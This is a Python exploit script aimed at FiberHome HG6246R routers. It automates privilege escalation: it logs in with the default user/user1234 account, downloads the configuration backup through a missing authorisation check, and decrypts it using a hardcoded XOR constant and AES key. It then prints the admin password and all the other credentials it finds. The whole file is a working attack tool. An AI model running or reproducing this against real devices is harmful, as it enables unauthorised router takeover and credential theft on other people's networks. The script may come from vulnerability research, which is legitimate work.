#!/usr/bin/env python3
"""
extract_admin_password.py — Full chain: download config backup → decrypt → extract admin password

The complete attack chain, automated:
1. Log in as user/user1234 (level 0 — no admin needed)
2. Download the encrypted config backup (the backend doesn't check user level)
3. Decrypt the XOR container (constant 9527)
4. Find and decrypt the AES-ECB credential values (key "ABCDEFGHIJKLMNOP")
5. Print the admin password and all other credentials found

Usage:
    python3 extract_admin_password.py                    # Full chain
    python3 extract_admin_password.py --offline config.bin  # Decrypt an already-downloaded backup
    python3 extract_admin_password.py --host 192.168.1.1    # Custom router IP

Requirements:
    - pycryptodome: pip install pycryptodome
    - Connected to the router's LAN
"""

import argparse
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from fhcrypto import decrypt_config, decrypt_credential, find_and_decrypt_credentials
from fhrouter import FHRouter


def decrypt_backup_file(encrypted_path: str, decrypted_path: str) -> str:
    """Decrypt a config backup file and return the text content."""
    with open(encrypted_path, "rb") as f:
        encrypted = f.read()

    # Sanity check: file size mod 16 != 0 rules out pure AES
    if len(encrypted) % 16 == 0:
        print(f"[*] Note: file size ({len(encrypted)}) is a multiple of 16 — could be AES too")
    else:
        print(f"[*] File size ({len(encrypted)}) mod 16 = {len(encrypted) % 16} — confirms XOR, not AES")

    decrypted = decrypt_config(encrypted)

    with open(decrypted_path, "wb") as f:
        f.write(decrypted)

    text = decrypted.decode("utf-8", errors="replace")
    print(f"[+] Decrypted {len(encrypted)} bytes → {decrypted_path}")

    # Verify it looks like UCI config
    if "config " in text[:200] or "option " in text[:500]:
        print("[+] Format: UCI config (OpenWrt-style) ✓")
    else:
        print("[!] Warning: decrypted content doesn't look like UCI config")
        print(f"    Preview: {text[:100]!r}")

    return text


def main():
    parser = argparse.ArgumentParser(
        description="Extract admin password from FiberHome HG6246R config backup"
    )
    parser.add_argument("--host", default="192.168.1.1", help="Router IP (default: 192.168.1.1)")
    parser.add_argument("--offline", metavar="FILE", help="Decrypt an already-downloaded backup instead of downloading")
    parser.add_argument("--keep-files", action="store_true", help="Keep intermediate files (encrypted + decrypted config)")
    args = parser.parse_args()

    encrypted_path = "usrconfig_conf"
    decrypted_path = "usrconfig_decrypted.txt"

    if args.offline:
        # Offline mode: just decrypt an existing file
        encrypted_path = args.offline
        print(f"[*] Offline mode: decrypting {encrypted_path}")
        config_text = decrypt_backup_file(encrypted_path, decrypted_path)
    else:
        # Full chain: download + decrypt
        print(f"[*] Connecting to {args.host}...")
        router = FHRouter(args.host)

        try:
            info = router.get_base_info()
            print(f"[+] Router: {info.get('model_name', '?')} — FW: {info.get('software_version', '?')}")
        except Exception as e:
            print(f"[!] Cannot reach router: {e}")
            sys.exit(1)

        print("[*] Logging in as user/user1234...")
        router.login()
        print("[+] Logged in")

        print("[*] Downloading config backup...")
        size = router.download_config(encrypted_path)
        print(f"[+] Downloaded {size} bytes")

        router.logout()
        print("[+] Logged out")

        config_text = decrypt_backup_file(encrypted_path, decrypted_path)

    # Find and decrypt credentials
    print()
    print("=" * 60)
    print("  DECRYPTED CREDENTIALS")
    print("=" * 60)

    credentials = find_and_decrypt_credentials(config_text)

    if not credentials:
        print("[!] No credential values found with automatic detection.")
        print("    The config format may differ. Check the decrypted file manually.")
    else:
        for name, hex_val, plaintext in credentials:
            if "Super" in name or "admin" in name.lower():
                print(f"\n  ★ {name}: {plaintext}")
                print(f"    (encrypted: {hex_val})")
            else:
                print(f"\n  • {name}: {plaintext}")
                print(f"    (encrypted: {hex_val})")

    print()
    print("=" * 60)

    # Cleanup
    if not args.keep_files and not args.offline:
        import os
        os.unlink(encrypted_path)
        os.unlink(decrypted_path)
        print("[*] Cleaned up intermediate files")
    else:
        print(f"[*] Files kept: {encrypted_path}, {decrypted_path}")

    print("[+] Done")


if __name__ == "__main__":
    main()
